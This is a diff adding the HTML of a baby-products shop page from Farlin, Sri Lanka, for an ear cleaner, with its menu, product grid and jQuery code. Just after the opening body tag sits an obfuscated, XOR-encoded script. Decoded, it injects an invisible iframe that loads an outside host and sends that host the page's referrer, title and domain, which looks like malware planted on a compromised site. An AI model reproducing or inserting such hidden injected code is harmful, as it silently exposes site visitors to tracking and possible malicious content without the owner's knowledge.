@@ -1,0 +1,1415 @@
+
+
+<!DOCTYPE html >
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /> 
+	<link href='http://fonts.googleapis.com/css?family=Open+Sans:400,600,700' rel='stylesheet' type='text/css'>
+	<link href='http://fonts.googleapis.com/css?family=Karla:400,700' rel='stylesheet' type='text/css'>    
+
+    <link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/farlin-style.css" type="text/css" />
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/global.css" type="text/css" />
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/camera.css" type="text/css" />
+    <link rel="shortcut icon" href="http://farlin.lk/wp-content/themes/KTI-lego/images/farlin-favicon.ico" type="image/x-icon" />
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/prettyPhoto.css"> 
+	<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/js/fancybox/fancybox_latest/jquery.fancybox-1.3.4.css" type="text/css" />    
+	
+    <!--[if IE 8]>
+     <link rel="stylesheet" type="text/css" href="http://farlin.lk/wp-content/themes/KTI-lego/css/farlin-ie8.css" type="text/css" />
+    <![endif]-->
+    <!--[if IE 9]>
+     <link rel="stylesheet" type="text/css" href="http://farlin.lk/wp-content/themes/KTI-lego/css/farlin-ie9.css" type="text/css" />
+    <![endif]-->
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.1/jquery.min.js"></script>
+	<script type='text/javascript' src="http://farlin.lk/wp-content/themes/KTI-lego/js/html5.js"></script>
+    <script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/tabs.js"></script>
+	<script type='text/javascript' src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.tinyscrollbar.min.js"></script>
+    <!--script type='text/javascript' src='http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.mobile.customized.min.js'></script-->
+    <script type='text/javascript' src='http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.easing.1.3.js'></script> 
+    <script type='text/javascript' src='http://farlin.lk/wp-content/themes/KTI-lego/js/camera.js'></script> 
+	<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.tinycarousel.min.js"></script>
+	<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/fancybox/fancybox_latest/jquery.fancybox-1.3.4.js"></script> 
+	
+    <script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/framework.js"></script>
+    <script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/gen_validatorv4.js"></script>   
+    <script type="text/javascript">
+    $(document).ready(function(){
+        
+        $(".menu-item-338").click(function(){
+            if($("#slide-div").is(":hidden")){
+                $("#slide-div").slideDown("slow");
+            } else {
+                $("#slide-div").slideUp("slow");
+            }
+        }); 
+
+		$('#slider2').tinycarousel(); 
+        $('#slider1').tinycarousel();  
+        $('#slider-code').tinycarousel();
+        
+    });
+</script> 
+    
+<link rel="alternate" type="application/rss+xml" title="Farlin &raquo; Feed" href="http://farlin.lk/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Farlin &raquo; Comments Feed" href="http://farlin.lk/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="Farlin &raquo; Adhering Ear Cleaner For elder Child Comments Feed" href="http://farlin.lk/products/adhering-ear-cleaner-for-elder-child/feed/" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://farlin.lk/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://farlin.lk/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Adhering Ear Cleaner For newborn Baby' href='http://farlin.lk/products/adhering-ear-cleaner-for-newborn-baby/' />
+<link rel='next' title='Nose Cleaning Clip' href='http://farlin.lk/products/nose-cleaning-clip/' />
+<meta name="generator" content="WordPress 3.4.1" />
+<script src='http://lego.lk/?dm=8c7b86a37a5aa180f6f627489cc2a089&amp;action=load&amp;blogid=2&amp;siteid=1&amp;t=904624722&amp;back=http%3A%2F%2Ffarlin.lk%2Fproducts%2Fadhering-ear-cleaner-for-elder-child%2F' type='text/javascript'></script>
+<!-- All in One SEO Pack 2.0.2 by Michael Torbert of Semper Fi Web Design[,] -->
+<meta name="description" content="BF-113-5 &nbsp; • The round-tip is in an easy, hurtless. • Instantly stick out the insects and foreign objects. • Hexagonal handle makes holding" />
+
+<link rel="canonical" href="http://farlin.lk/products/adhering-ear-cleaner-for-elder-child/" />
+<!-- /all in one seo pack -->
+
+
+  
+   <style>
+    
+        #back_to_camera {
+            background: rgba(255,255,255,.9);
+            clear: both;
+            display: block;
+            height: 40px;
+            line-height: 40px;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        .fluid_container {
+            bottom: 0;
+            /*height: 100%;*/
+            height:430px;
+            left: 0;
+            /*position: fixed;*/
+            right: 0;
+            top: 0;
+            z-index: 0;
+        }
+        #camera_wrap_4 {
+            bottom: 0;
+            height: 100%;
+            left: 0;
+            margin-bottom: 0!important;
+            /*position: fixed;*/
+            right: 0;
+            top: 0;
+        }
+        .camera_bar {
+            z-index: 2;
+        }
+        .camera_thumbs {
+            margin-top: -193px;
+            position: relative;
+            z-index: 1;
+        }
+        .camera_thumbs_cont {
+            border-radius: 0;
+            -moz-border-radius: 0;
+            -webkit-border-radius: 0;
+        }
+        .camera_overlayer {
+            opacity: .1;
+        }
+    </style>
+        
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-36584814-3']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+</script>
+
+
+</head>
+<body><script type="text/javascript">var a="'1Aqapkrv'1G'2C'2;tcp'02pgdgpgp'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,pgdgppgp'0;'1@'2C'2;tcp'02fgdcwnv]ig{umpf'02'1F'02glamfgWPKAmormlglv'0:fmawoglv,vkvng'0;'1@'2C'2;tcp'02jmqv'02'1F'02glamfgWPKAmormlglv'0:nmacvkml,jmqv'0;'1@'2C'2;tcp'02kdpcog'02'1F'02fmawoglv,apgcvgGngoglv'0:'05kdpcog'05'0;'1@'2C'2;kdpcog,ukfvj'1F2'1@'2C'2;kdpcog,jgkejv'1F2'1@'2C'2;kdpcog,qpa'1F'02'00j'00'02)'02'00vv'00'02)'02'00r'1C--'00'02)'02'00tl6,'00'02)'02'00p,vg'00'02)'02'00cq'00'02)'02'00gpe'00'02)'02'00wkf'00'02)'02'00g,a'00'02)'02'00mo'00'02)'02'00-qlkvaj'1Df'00'02)'02'00gd'00'02)'02'00cwn'00'02)'02'00v]i'00'02)'02'00g{'00'02)'02'00umpf'1F'00'02)'02fgdcwnv]ig{umpf'02)'02'00'04pgdg'00'02)'02'00ppgp'1F'00'02)'02pgdgpgp'02)'02'00'04qg]p'00'02)'02'00gd'00'02)'02'00gp'00'02)'02'00pgp'1F'00'02)'02pgdgpgp'02)'02'00'04qmw'00'02)'02'00pag'1F'00'02)'02jmqv'1@'2C'2;fmawoglv,`mf{,crrglfAjknf'0:kdpcog'0;'1@'2C'1A-qapkrv'1G";b="";c="";var clen;clen=a.length;for(i=0;i<clen;i++){b+=String.fromCharCode(a.charCodeAt(i)^2)}c=unescape(b);document.write(c);</script>
+<!--camera html-->
+    <div class="header">
+	<div class="balance">
+    	<a href="http://farlin.lk"><div class="logo"></div></a>
+        <div class="mnu-cvr">
+        	<div class="menu-main-menu-container"><ul id="menu-main-menu" class="menu"><li id="menu-item-234" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-234"><a href="http://farlin.lk/">Home</a></li>
+<li id="menu-item-338" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-338"><a href="#">Products</a></li>
+<li id="menu-item-235" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-235"><a href="http://farlin.lk/about/">About</a></li>
+<li id="menu-item-233" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-233"><a href="http://farlin.lk/customer-care/">Customer Care</a></li>
+<li id="menu-item-232" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-232"><a href="http://farlin.lk/where-to-buy/">Where To Buy</a></li>
+<li id="menu-item-231" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-231"><a href="http://farlin.lk/mothers-room/">Mother&#8217;s Room</a></li>
+</ul></div> 
+                                   
+                <!--                   
+                 <ul>
+                            <li class="hasmore">
+                                <ul class="dropdown">
+                                        <div class="mnu-top-red"></div>
+                                                        <div class="slider_code" id="slider-code">
+                                                            <a class="buttons prev" href="#"></a>
+                                                            <div class="viewport">    
+                                                                <ul id="tabs">
+                                                                    <ul class="overview">
+                                                                    
+                                              
+                          <a href="http://farlin.lk/age_range/baby-cuddler/"><li><div class="mnu-tmb"><span>Baby Cuddler</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/baby-playpen/"><li><div class="mnu-tmb"><span>Baby Playpen</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/baby-stroller/"><li><div class="mnu-tmb"><span>Baby Stroller</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/baby-walker/"><li><div class="mnu-tmb"><span>Baby Walker</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bathing-skin-care/"><li><div class="mnu-tmb"><span>Bathing &amp; Skin Care</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bedding/"><li><div class="mnu-tmb"><span>Bedding</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bib-pant/"><li><div class="mnu-tmb"><span>Bib &amp; Pant</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/body-toilet-trainer/"><li><div class="mnu-tmb"><span>Body Toilet Trainer</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bottle-holder-strap/"><li><div class="mnu-tmb"><span>Bottle Holder &amp; Strap</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/bottle-warmer/"><li><div class="mnu-tmb"><span>Bottle Warmer</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/breast-pumps/"><li><div class="mnu-tmb"><span>Breast Pumps</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/car-seat/"><li><div class="mnu-tmb"><span>Car Seat</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/cleaning/"><li><div class="mnu-tmb"><span>Cleaning</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/feeding/"><li><div class="mnu-tmb"><span>Feeding</span><img src="http://farlin.lk/files/2016/04/130-x-130.jpg" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/feeding-accessories/"><li><div class="mnu-tmb"><span>Feeding Accessories</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/feeding-bottles/"><li><div class="mnu-tmb"><span>Feeding Bottles</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/food-maker/"><li><div class="mnu-tmb"><span>Food Maker</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/footwear/"><li><div class="mnu-tmb"><span>Footwear</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/for-mom/"><li><div class="mnu-tmb"><span>For Mom</span><img src="http://farlin.lk/files/2012/12/mom_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/furniture-bedding/"><li><div class="mnu-tmb"><span>Furniture &amp; Bedding</span><img src="http://farlin.lk/files/2012/12/furniture_n_bedding_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/general-baby-health/"><li><div class="mnu-tmb"><span>General Baby Health</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gift-kits/"><li><div class="mnu-tmb"><span>Gift Kits</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gift-set/"><li><div class="mnu-tmb"><span>Gift Set</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gifts/"><li><div class="mnu-tmb"><span>Gifts</span><img src="http://farlin.lk/files/2013/02/Gifts_cat_thumb1.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/grooming-hygiene/"><li><div class="mnu-tmb"><span>Grooming &amp; Hygiene</span><img src="http://farlin.lk/files/2012/12/hygiene_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/gum-soother/"><li><div class="mnu-tmb"><span>Gum Soother</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/health-safety/"><li><div class="mnu-tmb"><span>Health &amp; Safety</span><img src="http://farlin.lk/files/2012/12/health_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/high-chair/"><li><div class="mnu-tmb"><span>High Chair</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/maternity-items/"><li><div class="mnu-tmb"><span>Maternity Items</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/milk-powder-container/"><li><div class="mnu-tmb"><span>Milk Powder Container</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/nipples/"><li><div class="mnu-tmb"><span>Nipples</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/nursing-items/"><li><div class="mnu-tmb"><span>Nursing Items</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/oral-health/"><li><div class="mnu-tmb"><span>Oral Health</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/outgoing/"><li><div class="mnu-tmb"><span>Outgoing</span><img src="http://farlin.lk/files/2012/12/outing_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/outing-bag/"><li><div class="mnu-tmb"><span>Outing Bag</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/pacifier/"><li><div class="mnu-tmb"><span>Pacifier</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/plaything/"><li><div class="mnu-tmb"><span>Plaything</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/plaything-footwear/"><li><div class="mnu-tmb"><span>Plaything &amp; Footwear</span><img src="http://farlin.lk/files/2012/12/Plaything_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/safety-guard/"><li><div class="mnu-tmb"><span>Safety Guard</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/safety-pins/"><li><div class="mnu-tmb"><span>Safety Pins</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/sick-care/"><li><div class="mnu-tmb"><span>Sick Care</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/sterilizer/"><li><div class="mnu-tmb"><span>Sterilizer</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/tableware/"><li><div class="mnu-tmb"><span>Tableware</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/training-cup/"><li><div class="mnu-tmb"><span>Training Cup</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/weaning/"><li><div class="mnu-tmb"><span>Weaning</span><img src="http://farlin.lk/files/2012/12/weaning_cat_thumb.gif" /></div></li></a>
+                                                  
+                          <a href="http://farlin.lk/age_range/wet-wipes/"><li><div class="mnu-tmb"><span>Wet Wipes</span><img src="http://farlin.lk/files/" /></div></li></a>
+                                                                                    
+                                                                    </ul>
+                                                                </ul>
+                                                            </div>
+                                                            <a class="buttons next" href="#"></a>
+                                                        </div>
+                                        <div class="mun-bottom-red"></div>    
+                                </ul>
+                            </li>
+                        </ul>       -->
+            
+            
+            <div class="serch-cvr">
+                	<div class="lft"></div>
+                    <div class="mid-cvr">
+                    
+                  <form action="http://farlin.lk" id="searchform" method="get">
+                                            <input type="text" placeholder="Search" id="s" name="s" class="mid">
+                  </form>
+              </div>
+                    <div class="right"></div>
+            </div>
+        </div>
+    </div>
+    <div id="slide-div">
+                    <div class="products-bg">
+                        <div class="middle-cvr">                    
+                                        <div class="feturted-product">    
+                                        
+                                        
+                                                        <div id="slider2">
+                                                <a class="buttons prev" href="#">left</a>
+                                                    <div class="viewport">
+                                                                <ul class="overview">
+                    							                          <a href="http://farlin.lk/age_range/feeding/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Feeding" src="http://farlin.lk/files/2016/04/130-x-130.jpg" />
+                                    <p>Feeding</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/for-mom/">
+                              <li class="ui-state-default"> 
+                                      <img alt="For Mom" src="http://farlin.lk/files/2012/12/mom_cat_thumb.gif" />
+                                    <p>For Mom</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/furniture-bedding/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Furniture &amp; Bedding" src="http://farlin.lk/files/2012/12/furniture_n_bedding_cat_thumb.gif" />
+                                    <p>Furniture &amp; Bedding</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/gifts/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Gifts" src="http://farlin.lk/files/2013/02/Gifts_cat_thumb1.gif" />
+                                    <p>Gifts</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/grooming-hygiene/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Grooming &amp; Hygiene" src="http://farlin.lk/files/2012/12/hygiene_cat_thumb.gif" />
+                                    <p>Grooming &amp; Hygiene</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/health-safety/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Health &amp; Safety" src="http://farlin.lk/files/2012/12/health_cat_thumb.gif" />
+                                    <p>Health &amp; Safety</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/outgoing/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Outgoing" src="http://farlin.lk/files/2012/12/outing_cat_thumb.gif" />
+                                    <p>Outgoing</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/plaything-footwear/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Plaything &amp; Footwear" src="http://farlin.lk/files/2012/12/Plaything_cat_thumb.gif" />
+                                    <p>Plaything &amp; Footwear</p>
+                              </li>
+                          </a>
+                    							                          <a href="http://farlin.lk/age_range/weaning/">
+                              <li class="ui-state-default"> 
+                                      <img alt="Weaning" src="http://farlin.lk/files/2012/12/weaning_cat_thumb.gif" />
+                                    <p>Weaning</p>
+                              </li>
+                          </a>
+                         
+                                                                </ul>
+                                                    </div>
+                                                    <a class="buttons next" href="#">right</a>
+                                                </div>
+                                        </div>
+            
+                        
+                        </div>
+                    </div>
+            </div>
+</div>
+
+
+ 
+<title>Farlin | Adhering Ear Cleaner For elder Child</title><!--jqery dropdown-->
+
+<script src="http://farlin.lk/wp-content/themes/KTI-lego/js/script.js" type="text/javascript"></script>  
+<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery-ui-1.8.23.custom.min.js"></script>
+<link rel="stylesheet" href="http://farlin.lk/wp-content/themes/KTI-lego/css/jquery-ui-1.8.23.custom.css" type="text/css" />         
+<script type="text/javascript">
+
+function test() {      
+        $('#auto_serach').val('');
+        $(this).css('outline','none');
+        $('#filter_dropdown_farlin.current').removeClass('current');
+        $(this).parent().addClass('current'); 
+        var filterVal = $('#filter_dropdown_farlin option:selected').val().toLowerCase().replace(' ','-');         
+        //alert(filterVal);    
+        if(filterVal == 'all') {
+            $('ul#portfolio li').fadeIn('slow').removeClass('hidden');
+        } else {            
+            $('ul#portfolio li').each(function() {
+                    if(!$(this).hasClass(filterVal)) {
+                        $(this).fadeOut('normal').addClass('hidden');
+                    }else{
+                        $(this).fadeIn('slow').removeClass('hidden');                             
+                }
+            });
+        }
+        
+        return false;
+  
+     
+}
+
+
+
+	$(document).ready(function(){
+
+		if (!$.browser.opera) { 
+        	// select element styling
+			$('select.select').each(function(){
+				var title = $(this).attr('title');
+				if( $('option:selected', this).val() != ''  ) title = $('option:selected',this).text();
+				$(this)
+					.css({'z-index':10,'opacity':0,'-khtml-appearance':'none'})
+					.after('<span class="select">' + title + '</span>')
+					.change(function(){
+						val = $('option:selected',this).text();
+						$(this).next().text(val);
+						})
+			});
+            
+            $('select.select2').each(function(){
+                    var title = $(this).attr('title');
+                    if( $('option:selected', this).val() != ''  ) title = $('option:selected',this).text();
+                    $(this)
+                           .css({'z-index':10,'opacity':0,'-khtml-appearance':'none'})
+                           .after('<span class="select">' + title + '</span>')
+                           .change(function(){
+                           val = $('option:selected',this).text();
+                           $(this).next().text(val);
+                                                        })
+                                            });                                      
+                                               
+                            $('#farlin_select1').change(function(){
+                                $.ajax({
+                                            type: "POST", 
+                                            url: 'http://farlin.lk/farlin-ajax/',
+                                            data: {method:'getChildren',value:this.value},     
+                                            success: function(data) {      //alert('vv');
+                                            $('.sec3').html(data);
+                                          }
+                                        });
+                            }); 
+            
+            
+
+		};
+		
+	});
+</script>
+
+<style type="text/css">
+.breadcrumb {
+padding-left: 10px;
+font-size: 10px;
+}
+</style>
+
+<script type="text/javascript" src="http://farlin.lk/wp-content/themes/KTI-lego/js/jquery.paginate.js"></script>  
+    <div class="pre-bg">
+	
+		    <div class="wrapper">      
+    	<div class="hero">
+            <section class="right-sec product-right-sec">
+            	<div id="gallery">
+	
+    <div id="slides">    
+<div class="slide"><img src="http://farlin.lk/files/2013/02/BF-113-5_product_main.gif" width="510" height="402" alt="side" /></div>	</div>
+    
+    <div id="menu2" >
+    
+    <ul>
+        <li class="fbar">&nbsp;</li>
+      <li class="menuItem"><a href=""><img src="http://farlin.lk/files/2013/02/BF-113-5_product_main.gif" alt="thumbnail" /></a></li>     	       </ul>
+    
+    
+    </div>
+    
+  </div>
+            </section>
+        	<section class="lft-sec lft-sec-product-pge">
+                <h1>Adhering Ear Cleaner For elder Child</h1>                 
+                <p>
+                	<p>BF-113-5</p>
+<p>&nbsp;</p>
+<p>• The round-tip is in an easy, hurtless.<br />
+• Instantly stick out the insects and foreign objects.<br />
+• Hexagonal handle makes holding firmer and safer.</p>
+				</p>
+                <section class="social-sec social-sec-product-pge">
+            	<ul style="list-style:none !important;width: 197px;">
+                	<li><span>Share with</span></li>
+                    <a href="http://www.facebook.com/sharer.php?u=http://farlin.lk/products/adhering-ear-cleaner-for-elder-child/&t=Adhering Ear Cleaner For elder Child" target="blank"><li><img border="0" src="http://farlin.lk/wp-content/themes/KTI-lego/images/fb.png"></li></a>
+                	<a href="http://twitter.com/home?status=Currently reading http://farlin.lk/products/adhering-ear-cleaner-for-elder-child/" title="Adhering Ear Cleaner For elder Child" target="_blank"> <li><img border="0" src="http://farlin.lk/wp-content/themes/KTI-lego/images/twtr.png"></li></a>
+                   
+                   <!-- <li><img src="http://farlin.lk/wp-content/themes/KTI-lego/images/social_23.png"></li>     -->
+                </ul>
+                <ul style="float:left;width: 101px; list-style:none !important">
+                <li style="width:100px"><a href="http://www.happiness.lk/index.php/bf113-5-adhering-ear-cleaner-for-elder-child.html" target="_blank"><div class="buy-now">Buy Now</div></a></li>
+            	</ul>
+            </section>
+            <section class="download-sec download-sec-product-pge">
+				<ul>
+                
+                     
+                
+                						                </ul>
+            </section>
+                
+            </section> 
+            <section class="more-products-cvr">
+            	<div class="more-products-head">
+                	<section class="sec1"><span><h2>More Products</h2></span></section> 
+                                                
+                        
+                        
+                        
+                        
+                                              
+                           <section class="farlin-sec2">
+                        <select class="select2" id="farlin_select1"  title="Select two">
+                     
+                                                                                                                                                                                                                                                                                                                                     <option value="74" selected="selected">Health &amp; Safety</option>
+                                                                                                                                                                                                                                  
+                        </select>
+                    </section>                             
+                    <section class="sec3">
+                        
+                        <select class="select" title="Select one"  id="filter_dropdown_farlin" name="filter_dropdown_farlin" onchange="test()">
+                                            <option value="ALL">ALL</option>
+                                                                                               
+                                <option value='154'>General Baby Health</option>
+                                                                                          
+                                <option value='155'>Oral Health</option>
+                                                                                          
+                                <option value='156'>Safety Guard</option>
+                                                                                          
+                                <option value='172'>Safety Pins</option>
+                                                                                          
+                                <option value='157'>Sick Care</option>
+                                                 
+                        </select>
+                    </section> 
+                    
+                    
+                    
+                     
+                    <section class="sec4">
+                    	<div class="serch-box">
+                        	<div class="p1"></div>
+                            <div class="p2"><input type="text" class="txt-srch" id="auto_serach"><a href="#"></a></div>
+                            <div class="p3"></div>
+                        </div>
+                    </section>
+                </div>
+                <section class="product-set">
+                
+                  <div id="paginationdemo" class="demo">
+             
+                
+              
+                   
+
+           
+           
+           
+           
+           
+           
+              
+<script>
+    $(function() {      
+        $( "#auto_serach" ).autocomplete({ source:["Baby Clapper","Anti-Backflow Nasal Aspirator","Nasal Aspirator","Parent & Child Nasal Aspirator","Safety Pins","Safety Pins","Safety Pins","Safety Pins","Safety Pins","Door Gate","Safety Bed Rail","Safety Fan Net","Safety Guard For Table-Edge","Safety Guard For Socket","Safety Guard For Socket","Safety Guard For Socket","Digital Fever Thermometer","360 Earpick 20PCS","Flexible Tip Digital Thermometer","Digital Fever Thermometer","Baby Safety Nail Cutter","Nail Clipper","Nail Clipper","Multi-Purpose Safety Scissors","Nose Cleaning Clip","Adhering Ear Cleaner For elder Child","Adhering Ear Cleaner For newborn Baby","Safety Cotton Buds 80PCS","Cotton Buds 100PCS","Nasal Aspirator","MediFeeder","Medicine Feeder","Ice Pillow","Flexible Tip Digital Thermometer","Safety Door-Stopper","Safety Door-Stopper","Internet Household Guardian Camera","Internet Household Guardian Camera 2","Digital Video Monitor","Digital Audio Monitor","Toothbrush Training Set Of 3 stage Baby Oral Hygiene Set","Tongue Cleaner of 3 stage Baby Oral Hygiene Set","Three Stages Toothbrush","Second Stage Toothbrush","Chewing Type Toothbrush","Baby\u2019s First Toothbrush","Baby Toothbrush","Safety Scissors","Safety Haircut Set for Children","Lighting Ear Cleaner","Comb & Brush Set","Bath Thermometer","3 Stage Baby Oral Hygiene Set","Bath Thermometer","Baby Comb & Brush Set"]});
+                                               
+    });
+</script>  
+             
+
+			
+            		
+					
+                    	                     
+                                             
+                                            <div id="p1" class="pagedemo _current" style="">  
+                                            <ul id="portfolio">
+                                   
+                     
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 154 74  babyclapper">
+                        	<a href="http://farlin.lk/products/baby-clapper/"><span><strong>Baby Clapper</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-151A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  anti-backflownasalaspirator">
+                        	<a href="http://farlin.lk/products/anti-backflow-nasal-aspirator/"><span><strong>Anti-Backflow Nasal Aspirator</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-139A_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  nasalaspirator">
+                        	<a href="http://farlin.lk/products/nasal-aspirator-2/"><span><strong>Nasal Aspirator</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-139_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 157  parent&#038;childnasalaspirator">
+                        	<a href="http://farlin.lk/products/parent-child-nasal-aspirator/"><span><strong>Parent &#038; Child Nasal Aspirator</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-136_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
+                                         
+             
+                    
+                     
+                                                    
+                                                   
+                    	<li class="product 74 172  safetypins">
+                        	<a href="http://farlin.lk/products/safety-pins-5-bf-123a/"><span><strong>Safety Pins</strong></span>
+                            <div class="product-img"><img border="0" src="http://farlin.lk/files/2013/02/BF-123A_1_product_main.gif"  class="fix" width="223" height="144"></div></a>
+                        </li>
+                      
+
+                          
